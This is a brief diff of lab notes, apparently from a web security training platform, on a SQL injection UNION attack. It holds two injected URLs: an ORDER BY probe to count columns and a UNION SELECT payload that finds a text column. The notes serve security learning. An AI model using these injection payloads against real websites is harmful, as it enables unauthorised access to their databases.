@@ -1,0 +1,7 @@
+SQL injection UNION attack, finding a column containing text
+
+Finding the number of columns
+https://0a8e007304f9b523ab23df0100af0019.web-security-academy.net/filter?category=Gifts' order by 3--
+
+Put NULL,NULL,NULL then replace one NULL by characters 
+https://0a8e007304f9b523ab23df0100af0019.web-security-academy.net/filter?category=Gifts' union select NULL,'OffRXs',NULL--
